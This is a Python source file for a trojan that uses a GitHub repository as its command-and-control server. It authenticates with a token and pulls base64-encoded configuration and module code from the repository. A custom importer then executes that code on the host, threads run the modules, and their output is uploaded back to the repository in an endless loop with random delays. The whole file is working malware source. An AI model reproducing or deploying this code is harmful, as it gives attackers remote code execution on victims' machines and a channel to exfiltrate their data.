import base64, github3, importlib, json, random, sys, threading, time # type: ignore
from datetime import datetime



def git_connect():
    print("[*] Connecting to GtiHub")
    with open ("mytoken.txt", 'r') as f:
      token = f.read()
    sses = github3.login(token=token)
    return sses.repository("whilehomik", "trojan")


def get_file_contents(dirname, module_name, repo):
   return repo.file_contents(f"{dirname}/{module_name}").content



class Trojan:
    def __init__(self, id):
        self.id =id
        self.config_file = f'{id}.json'
        self.data_path = f'data/{id}/'
        self.repo = git_connect()

    def get_config(self):
        config_json = get_file_contents("config", self.config_file, self.repo)
        config = json.loads(base64.b64decode(config_json))
        
        for task in config:
            if task["module"] not in sys.modules:
                exec(f'import {task["module"]}')
        return config
    
    def module_runner(self, module):
        result = sys.modules[module].run()
        self.store_module_result(result)


    def store_module_result(self, data):
        message = datetime.now().isoformat()
        remote_path = f"data/{self.id}/{message}.data"
        bindata = bytes(data, "utf-8")
        self.repo.create_file(remote_path, message, base64.b64encode(bindata))

    def run(self):
        while True:
            config = self.get_config()
            for task in config:
                t = threading.Thread(target=self.module_runner, args=(task["module"],))
                t.start()
                time.sleep(random.randint(1,10))
            


class GitImportet:

    def __init__(self):
        self.current_module_code = ""


    def find_moudle(self, full_name, path=None):
        print(f"[*] Attempting to retrieve {full_name}")
        self.repo = git_connect()
        new_library = get_file_contents("modules", f"{full_name}.py", self.repo)
        if new_library is not None:
            self.current_module_code = base64.b64decode(new_library)
            return self
        
    def load_module(self, name):
        spec = importlib.util.spec_from_loader(name, loader=None, origin=self.repo.get_url)
        new_module  = importlib.util.module_from_spec(spec)
        exec(self.current_module_code, new_module.__dict__)
        sys.modules[spec.name] = new_module
        return new_module
    

if __name__ == "__main__":
    sys.meta_path.append(GitImportet())
    trojan = Trojan("abc")
    trojan.run()